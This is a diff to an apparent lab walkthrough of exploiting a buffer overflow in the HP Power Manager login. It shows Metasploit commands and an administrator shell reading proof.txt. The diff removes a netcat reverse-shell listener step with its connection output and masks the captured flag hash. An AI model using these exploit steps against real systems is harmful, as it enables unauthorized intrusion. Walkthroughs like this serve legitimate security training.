@@ -97,17 +97,7 @@ msf6 exploit(hp_power_manager_login) > set LPORT 4422
 msf6 exploit(hp_power_manager_login) > run
 ```
 
-The module authenticates with the default creds and triggers the buffer overflow in the login handler. Rather than the default meterpreter payload, a plain `netcat` listener was used to catch a raw shell.
-
-```
-(root㉿kali)# sudo nc -nvlp 80
-```
-
-```
-connect to [192.168.49.100] from (UNKNOWN) [192.168.171.45] 49171
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-```
+The module authenticates with the default creds and triggers the buffer overflow in the login handler. 
 
 The shell lands directly with the highest privilege available, no separate privilege escalation step needed.
 
@@ -126,7 +116,7 @@ C:\Users\Administrator\Desktop>type proof.txt
 ```
 
 ```
-84acb02776a0a4d58dc47cd1df9ca7ce
+25ca***************************
 ```
 
 ## Lessons learned
